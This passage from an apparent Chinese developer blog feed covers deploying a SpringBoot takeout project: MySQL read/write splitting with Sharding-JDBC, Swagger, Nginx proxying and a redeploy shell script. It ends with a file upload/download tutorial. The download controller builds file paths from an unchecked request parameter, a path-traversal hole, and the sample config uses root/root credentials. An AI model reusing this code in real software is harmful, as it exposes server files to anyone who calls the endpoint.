src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e471059730274a98a3a6b2e71728724f.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/dc067197d93b4799a37e5d51f28c5736.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/5657bb24170a4fbe8a9139b954934164.png" alt="在这里插入图片描述" /><br />到这里就算搭建完成了</p><h3 id="遇到的问题"><a class="markdownIt-Anchor" href="#遇到的问题"></a> 遇到的问题</h3><p>这里遇到的问题，连不上<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/cbb888adff9c45be994e4087e528d9dc.png" alt="在这里插入图片描述" /><br />想本地当主机，外网当从机好像不太行，我就又弄了台服务器做读写分离</p><p>搞到了从机之后，就开始配置，安装MySQL等等</p><p>有的时候会提示io冲突，这是因为之前的从机没有关闭，关闭一下就可以了<br /><code>stop slave</code> 一下 就可以运行了</p><p>一个从机启动命令忘记了，改了一晚上<br />如果不运行从机启动就会变成这样<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/85ee4381b01c44ccb0777995ba042e46.png" alt="在这里插入图片描述" /></p><h2 id="主写从读实战"><a class="markdownIt-Anchor" href="#主写从读实战"></a> 主写从读实战</h2><h3 id="概述-2"><a class="markdownIt-Anchor" href="#概述-2"></a> 概述</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f141bcd96b9840bd8a4e1295055408a1.png" alt="在这里插入图片描述" /><br />难么如何去确定来的SQL应该分配到哪个库上，这个就要靠Sharding-jdbc框架来读写分离的分流处理<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/83f78cd07cd848de9c4b5abd422d4b91.png" alt="在这里插入图片描述" /></p><h3 id="实战"><a class="markdownIt-Anchor" href="#实战"></a> 实战</h3><p>步骤如下<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f72981dfa9204bab9545793d04bc2ed9.png" alt="在这里插入图片描述" /><br />导入Maven坐标</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shardingsphere<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>sharding-jdbc-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0-RC1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>配置yml文件</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">application:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">ccTakeOut</span><br>  <span class="hljs-attr">shardingsphere:</span><br>    <span class="hljs-attr">datasource:</span><br>      <span class="hljs-attr">names:</span><br>        <span class="hljs-string">master,slave</span><br>      <span class="hljs-comment"># 主库（增删改操作）</span><br>      <span class="hljs-attr">master:</span><br>        <span class="hljs-attr">type:</span> <span class="hljs-string">com.alibaba.druid.pool.DruidDataSource</span><br>        <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.jdbc.Driver</span><br>        <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://192.168.23.132:3307/reggie?characterEncoding=utf-8</span><br>        <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>        <span class="hljs-attr">password:</span> <span class="hljs-string">root</span><br>      <span class="hljs-comment"># 从数据源（读操作）</span><br>      <span class="hljs-attr">slave:</span><br>        <span class="hljs-attr">type:</span> <span class="hljs-string">com.alibaba.druid.pool.DruidDataSource</span><br>        <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.jdbc.Driver</span><br>        <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://192.168.23.132:3308/reggie?characterEncoding=utf-8</span><br>        <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>        <span class="hljs-attr">password:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">masterslave:</span><br>      <span class="hljs-comment"># 读写分离配置</span><br>      <span class="hljs-attr">load-balance-algorithm-type:</span> <span class="hljs-string">round_robin</span> <span class="hljs-comment">#轮询（如果有多个从库会轮询着读）</span><br>      <span class="hljs-comment"># 最终的数据源名称</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">dataSource</span><br>      <span class="hljs-comment"># 主库数据源名称</span><br>      <span class="hljs-attr">master-data-source-name:</span> <span class="hljs-string">master</span><br>      <span class="hljs-comment"># 从库数据源名称列表，多个逗号分隔</span><br>      <span class="hljs-attr">slave-data-source-names:</span> <span class="hljs-string">slave</span><br>    <span class="hljs-attr">props:</span><br>      <span class="hljs-attr">sql:</span><br>        <span class="hljs-attr">show:</span> <span class="hljs-literal">true</span> <span class="hljs-comment">#开启SQL显示，默认false</span><br>  <span class="hljs-attr">main:</span><br>    <span class="hljs-attr">allow-bean-definition-overriding:</span> <span class="hljs-literal">true</span> <span class="hljs-comment">#允许bean数据源覆盖</span><br><br><br></code></pre></td></tr></table></figure><p>​</p><p>解读一下yml配置<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7e5c203773a04fdd9b9a096659db9749.png" alt="在这里插入图片描述" /><br /><strong>允许Bean定义覆盖很重要</strong></p><h3 id="测试-2"><a class="markdownIt-Anchor" href="#测试-2"></a> 测试</h3><p>启动项目，可以看到，读写操作分别到达了不同的主机上<br />读写分离测试<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f647f0ab726e48f7a4ae0445970980d2.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/fd937b8b481946bba8325127319d22f9.png" alt="在这里插入图片描述" /></p><h1 id="nginx部署"><a class="markdownIt-Anchor" href="#nginx部署"></a> Nginx部署</h1><p><a href="https://blog.csdn.net/weixin_46906696/article/details/125569407?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22125569407%22,%22source%22:%22weixin_46906696%22%7D&amp;ctrtid=O48Rx">Nginx笔记</a></p><h1 id="前后端分离开发"><a class="markdownIt-Anchor" href="#前后端分离开发"></a> 前后端分离开发</h1><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/5ae7a5c5f65049e698b47a060c9b9ac8.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/9b200bae5d514949b1fed2860598906a.png" alt="在这里插入图片描述" /></p><h2 id="开发流程"><a class="markdownIt-Anchor" href="#开发流程"></a> 开发流程</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/9d4d3ca75521432a999246d1ff68cea2.png" alt="在这里插入图片描述" /></p><h2 id="yapi"><a class="markdownIt-Anchor" href="#yapi"></a> YApi</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b56ddabf9931461dab56dafdd5614088.png" alt="在这里插入图片描述" /></p><h2 id="swagger常用"><a class="markdownIt-Anchor" href="#swagger常用"></a> Swagger（常用）</h2><p>主要作用就是帮助后端人员生成后端接口文档的<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7352d150c2b64d3e9c84f15ce56c7c1d.png" alt="在这里插入图片描述" /><br />使用方式<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b22b2f0ae0c04a4db76fe8e8fa047615.png" alt="在这里插入图片描述" /><br />导入坐标</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--knife4j接口管理--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.xiaoymin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>knife4j-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>导入配置类</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221126213937943.png" alt="image-20221126213937943" /></p><p>具体配置位置<code>com.xyy.config.WebMvcConfig</code></p><p>启动服务，访问路径+doc.html<br />进入之后就可以对已有的接口进行管理了<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/28fa1199bed745909c1ab3566ef46517.png" alt="在这里插入图片描述" /></p><h2 id="swagger常用注解"><a class="markdownIt-Anchor" href="#swagger常用注解"></a> Swagger常用注解</h2><p>直接生成的注解内容并不是很完善<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7b2482af3df7429ea060c692c9778524.png" alt="在这里插入图片描述" /><br />Swagger常用注解<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/96378f7383e34de1a6ef9f7785989c2d.png" alt="在这里插入图片描述" /><br />以实体类为例<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0fbe9d3e59ee47d0b5a9f8d6b21609af.png" alt="在这里插入图片描述" /><br />Controller上的注解<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/920dcfe50e8544f0ab5a42581722b3e3.png" alt="在这里插入图片描述" /><br />以上均为示例，最终完善好注解，文档会更好用，更详细。</p><h1 id="项目部署"><a class="markdownIt-Anchor" href="#项目部署"></a> 项目部署</h1><h2 id="前端"><a class="markdownIt-Anchor" href="#前端"></a> 前端</h2><p>前端作为一个工程，同样需要打包，打包完为dist目录<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/a2cee8e970754767bf5efab50eb3d065.png" alt="在这里插入图片描述" /><br />把这个dist目录，扔进Nginx里HTML文件夹就可以了，也就是那个静态资源<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e05ae7caf6ce4c82b5dd35e96ba97059.png" alt="在这里插入图片描述" /><br />传上来不算完，还要好好配置一下<br />一个是静态资源，另一个是反向代理</p><h3 id="静态资源配置"><a class="markdownIt-Anchor" href="#静态资源配置"></a> 静态资源配置</h3><p>先配置静态资源<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/85400722cc984e53bc62af167a80ba13.png" alt="在这里插入图片描述" /></p><h3 id="请求代理配置"><a class="markdownIt-Anchor" href="#请求代理配置"></a> 请求代理配置</h3><p>重启Nginx，测试一下，访问。<br />随便一个请求可以看到，带了前缀<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221126220228420.png" alt="image-20221126220228420" /><br />后端项目给的端口是9001<br />请求路径为：<a href="http://www.ccsmile.fun:9001/api/employee/login">http://www.ccsmile.fun:9001/api/employee/login</a><br />我们后端是没有这个api的前缀的<br />通过重写url，就可以把<br /><code>http://localhost:81/api/employee/page?page=1&amp;pageSize=10</code><br />变成<br /><code>http://192.168.132.23:8080/employee/page?page=1&amp;pageSize=10</code>的请求地址，这样就完成了请求代理转发操作<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221126220352391.png" alt="image-20221126220352391" /><br />配置文件如下</p>  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json">server<span class="hljs-punctuation">&#123;</span><br>  listen <span class="hljs-number">80</span>;<br>  server_name localhost;<br>#静态资源配置<br>  location /<span class="hljs-punctuation">&#123;</span><br>    root html/dist;<br>    index index.html;<br>  <span class="hljs-punctuation">&#125;</span><br>#请求转发代理，重写URL+转发<br>  location ^~ /api/<span class="hljs-punctuation">&#123;</span><br>          rewrite ^/api/(.*)$ /$<span class="hljs-number">1</span> break;<br>          proxy_pass http<span class="hljs-punctuation">:</span><span class="hljs-comment">//后端服务ip:端口号;</span><br>  <span class="hljs-punctuation">&#125;</span><br>#其他<br>  error_page <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span> /<span class="hljs-number">50</span>x.html;<br>  location = /<span class="hljs-number">50</span>x.html<span class="hljs-punctuation">&#123;</span><br>      root html;<br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>最后保存文件，重启Nginx，就配置完成了</p><h2 id="后端"><a class="markdownIt-Anchor" href="#后端"></a> 后端</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/23e1f1e20f0b420ca3fa8856aa07efaa.png" alt="在这里插入图片描述" /><br />上传脚本，自动拉取最新脚本<br />这样在开发端和Linux端就通过Gitee间接实现同步了<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/c2cf53f4a6044202b5e5b7136a9bc0ef.png" alt="在这里插入图片描述" /><br />脚本内容</p><p>​</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">echo</span> =================================<br><span class="hljs-built_in">echo</span>  自动化部署脚本启动<br><span class="hljs-built_in">echo</span> =================================<br><br><span class="hljs-built_in">echo</span> 停止原来运行中的工程<br>APP_NAME=reggie_take_out<br><br>tpid=`ps -ef|grep <span class="hljs-variable">$APP_NAME</span>|grep -v grep|grep -v <span class="hljs-built_in">kill</span>|awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>`<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$&#123;tpid&#125;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Stop Process...&#x27;</span><br>    <span class="hljs-built_in">kill</span> -15 <span class="hljs-variable">$tpid</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">sleep</span> 2<br>tpid=`ps -ef|grep <span class="hljs-variable">$APP_NAME</span>|grep -v grep|grep -v <span class="hljs-built_in">kill</span>|awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>`<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$&#123;tpid&#125;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Kill Process!&#x27;</span><br>    <span class="hljs-built_in">kill</span> -9 <span class="hljs-variable">$tpid</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Stop Success!&#x27;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">echo</span> 准备从Git仓库拉取最新代码<br><span class="hljs-built_in">cd</span> /usr/local/javaapp/reggie_take_out<br><br><span class="hljs-built_in">echo</span> 开始从Git仓库拉取最新代码<br>git pull<br><span class="hljs-built_in">echo</span> 代码拉取完成<br><br><span class="hljs-built_in">echo</span> 开始打包<br>output=`mvn clean package -Dmaven.test.skip=<span class="hljs-literal">true</span>`<br><br><span class="hljs-built_in">cd</span> target<br><br><span class="hljs-built_in">echo</span> 启动项目<br><span class="hljs-built_in">nohup</span> java -jar reggie_take_out-1.0-SNAPSHOT.jar &amp;&gt; reggie_take_out.log &amp;<br><span class="hljs-built_in">echo</span> 项目启动完成<br><br><br><br></code></pre></td></tr></table></figure><p>​<br />​</p><p>执行脚本就OK了<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/079d294160f94539b7b3db5d09af969e.png" alt="在这里插入图片描述" /></p><p>记得修改yml文件中的部分内容，比如文件路径等等信息~<br />完结撒花啦</p><ol><li><a href="https://www.bilibili.com/video/BV13a411q753?p=176&amp;spm_id_from=pageDriver&amp;vd_source=a432f7b466d0eab98b92ac7132f5ca5c">黑马程序员Java项目实战《瑞吉外卖》，轻松掌握springboot + mybatis plus开发核心技术的真java实战项目 </a></li><li>风吟Pro的<a href="https://blog.csdn.net/weixin_46906696/article/details/125040457#comments_23962173">瑞吉外卖笔记</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Web项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringBoot</tag>
      
      <tag>项目</tag>
      
      <tag>瑞吉外卖</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot将文件上传到项目的根路径中，使用相对路径</title>
    <link href="/2022/11/25/SpringBoot%E5%B0%86%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%A0%B9%E8%B7%AF%E5%BE%84%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84/"/>
    <url>/2022/11/25/SpringBoot%E5%B0%86%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%A0%B9%E8%B7%AF%E5%BE%84%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84/</url>
    
    <content type="html"><![CDATA[<h1 id="SpringBoot将文件上传到项目的根路径中，使用相对路径"><a href="#SpringBoot将文件上传到项目的根路径中，使用相对路径" class="headerlink" title="SpringBoot将文件上传到项目的根路径中，使用相对路径"></a>SpringBoot将文件上传到项目的根路径中，使用相对路径</h1><ol><li><p>application.yml</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221125185250894.png" alt="image-20221125185250894"></p></li><li><p><strong>controller</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java">RestController<br><span class="hljs-meta">@RequestMapping(&quot;/common&quot;)</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonController</span> &#123;<br>    <span class="hljs-meta">@Value(&quot;$&#123;takeOutFile.fileLocation:&#125;&quot;)</span><br>    <span class="hljs-keyword">private</span> String filePath;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 文件上传</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> file org.springframework.web.multipart.MultipartFile</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> com.xyy.reggie.common.R&lt;java.lang.String&gt;</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> 席子</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span><br>    <span class="hljs-keyword">public</span> R&lt;String&gt; <span class="hljs-title function_">upload</span><span class="hljs-params">(MultipartFile file)</span> &#123;<br><br>        <span class="hljs-comment">//原始文件名</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();<br>        <span class="hljs-keyword">assert</span> originalFilename != <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">suffix</span> <span class="hljs-operator">=</span> originalFilename.substring(originalFilename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>));<br><br>        <span class="hljs-comment">//使用UUID重新生成文件名，防止文件名称重复造成文件覆盖</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString() + suffix;<br><br>        <span class="hljs-comment">//创建一个目录对象</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filePath);<br>        <span class="hljs-comment">//判断当前目录是否存在</span><br>        <span class="hljs-keyword">if</span> (!dir.exists()) &#123;<br>            <span class="hljs-comment">//目录不存在，需要创建</span><br>            dir.mkdirs();<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            file.transferTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dir.getAbsolutePath() +File.separator+ fileName));<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> R.success(fileName);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 文件下载</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name     java.lang.String</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> response javax.servlet.http.HttpServletResponse</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> 席子</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@GetMapping(&quot;/download&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">download</span><span class="hljs-params">(String name, HttpServletResponse response)</span> &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//输入流，通过输入流读取文件内容</span><br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filePath +File.separator+  name));<br><br>            <span class="hljs-comment">//输出流，通过输出流将文件写回浏览器</span><br>            <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream();<br><br>            response.setContentType(<span class="hljs-string">&quot;image/jpeg&quot;</span>);<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">while</span> ((len = fileInputStream.read(bytes)) != -<span class="hljs-number">1</span>) &#123;<br>                outputStream.write(bytes, <span class="hljs-number">0</span>, len);<br>                outputStream.flush();<br>            &#125;<br><br>            <span class="hljs-comment">//关闭资源</span><br>            outputStream.close();<br>            fileInputStream.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>效果</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221125185348635.png" alt="image-20221125185348635"></p></li></ol><blockquote><p>SpringBoot文件上传下载怎么使用就不说了，说说怎么使用<strong>相对路径</strong>把文件存储到项目根目录去</p></blockquote><ol start="4"><li><p>代码分析</p><ol><li><p>我们使用<code>MultipartFile的transferTo()</code>进行文件本地持久化</p></li><li><p>但是<code>MultipartFile的transferTo()</code>方法会监测传入其中的File对象的路径是否为绝对路径，如果不是绝对路径，&#x3D;&#x3D;会自动拼接application里设置的路径 和 \work\Tomcat\localhost\ROOT&#x3D;&#x3D;。</p><p>所以出现</p><p>java.io.FileNotFoundException: C:\Users\XXX\AppData\Local\Temp\tomcat.8080.6103676472064121995\work\Tomcat\localhost\ROOT\src\main\resources\takeOutFiled10b193c1-c840-4570-88c3-874ef18e73b5.png (系统找不到指定的路径。)</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221125190148520.png" alt="image-20221125190148520" style="zoom: 100%;" /></li><li><p>所以只要给它一个绝对路径就可以了</p></li><li><p><code>file.transferTo(new File(dir.getAbsolutePath() +File.separator+ fileName));</code></p><p><code>dir.getAbsolutePath()</code> 得到储存文件目录的绝对路径</p><p><code>File.separator</code> 就是   <strong>&#x2F;</strong></p><p><code>fileName</code> 你要存储的文件名</p></li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>SpringBoot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringBoot</tag>
      
      <tag>小问题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue_Basic_learning</title>
    <link href="/2022/11/24/vue_Basic_learning/"/>
    <url>/2022/11/24/vue_Basic_learning/</url>
    
